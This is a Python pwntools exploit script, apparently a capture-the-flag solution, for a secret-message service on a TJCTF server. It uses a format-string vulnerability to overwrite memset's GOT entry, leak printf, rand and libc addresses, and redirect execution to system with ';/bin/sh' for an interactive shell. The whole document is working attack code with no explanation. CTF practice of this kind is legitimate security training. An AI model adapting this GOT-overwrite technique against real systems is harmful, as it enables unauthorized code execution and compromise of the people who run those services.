from pwn import *

r = remote('problem1.tjctf.org', 8009)

def set_message(password, message):
	r.sendafter('> ', 's\n')
	r.sendafter('Message Password:\n', password + '\n')
	r.sendafter('Secret Message:\n', message + '\n')

def get_message(password):
	r.sendafter('> ', 'v\n')
	r.sendafter('Message Password:\n', password + '\n')
	r.recvuntil('====================\n')
	response = r.recvuntil('====================\n').replace('====================\n', '').rstrip('\n')
	r.recvuntil('Captcha: ')
	r.sendafter('\n', 'test\n')
	return response

log.info('Overwrite memset got entry with address of secure_service')

memset_got = 0x602050

password = ''
password += p64(memset_got)

message = ''
message += '%3488x%22$hn'

raw_input('Press enter to continue...')

set_message(password, message)
get_message(password)

set_message(p64(0x602048), '%22$s')
log.info("printf @ " + hex(u64(get_message(p64(0x602048))[:8].ljust(8, '\x00'))))

set_message(p64(0x602088), '%22$s')
log.info("rand @ " + hex(u64(get_message(p64(0x602088))[:8].ljust(8, '\x00'))))

log.info('Leak libc address')

set_message('1234', '%11$p')

libc = int(get_message('1234'), 16) - 0x3eba00

log.info('libc @ ' + hex(libc))
libc_system = libc + 0x4f440

password = ''
password += p64(memset_got)
password += p64(memset_got + 2)
password += p64(memset_got + 4)

writes_1 = libc_system & 0xffff
writes_2 = 0x10000 + ((libc_system >> 16) & 0xffff) - writes_1
writes_3 = 0x30000 + ((libc_system >> 32) & 0xffff) - writes_2 - writes_1

message = ''
message += '%' + str(writes_1) + 'x%22$hn%' + str(writes_2) + 'x%23$hn%' + str(writes_3) + 'x%24$hn'
message += ';/bin/sh'

set_message(password, message)
get_message(password)

r.interactive()
